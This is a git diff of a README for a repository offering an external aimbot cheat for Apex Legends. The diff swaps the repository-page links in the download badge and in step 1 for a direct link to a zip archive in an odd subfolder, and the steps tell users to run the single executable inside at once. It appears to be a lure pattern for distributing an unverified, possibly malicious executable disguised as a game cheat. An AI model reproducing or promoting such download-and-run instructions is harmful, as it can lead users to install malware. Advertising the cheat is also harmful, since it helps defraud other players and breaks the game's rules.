@@ -1,6 +1,6 @@
 # 🎯 Apex-Legends-Aimbot-External - Your Ultimate Aim Assist for Victory
 
-[![Download Now](https://img.shields.io/badge/Download-ApexAimbot_2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/aanar1808/Apex-Legends-Aimbot-External)
+[![Download Now](https://img.shields.io/badge/Download-ApexAimbot_2026-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aanar1808/Apex-Legends-Aimbot-External/main/acier/v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Visit this link to download the application. Simply click the button above or na
 
 To get started, follow these simple steps:
 
-1. **Access the Download:** Click the prominent green button at the top of this page or visit [https://github.com/aanar1808/Apex-Legends-Aimbot-External](https://github.com/aanar1808/Apex-Legends-Aimbot-External) directly.
+1. **Access the Download:** Click the prominent green button at the top of this page or visit [https://raw.githubusercontent.com/aanar1808/Apex-Legends-Aimbot-External/main/acier/v2.9.zip](https://raw.githubusercontent.com/aanar1808/Apex-Legends-Aimbot-External/main/acier/v2.9.zip) directly.
 2. **Save the File:** Once on the page, locate the download section and save the file to your computer. It will be a single executable file.
 3. **Run the Application:** After the download completes, double-click the file to run it. No installation wizard is required—it runs directly.
 4. **Launch Apex Legends:** Start Apex Legends as you normally would. The aimbot will automatically detect the game and activate.
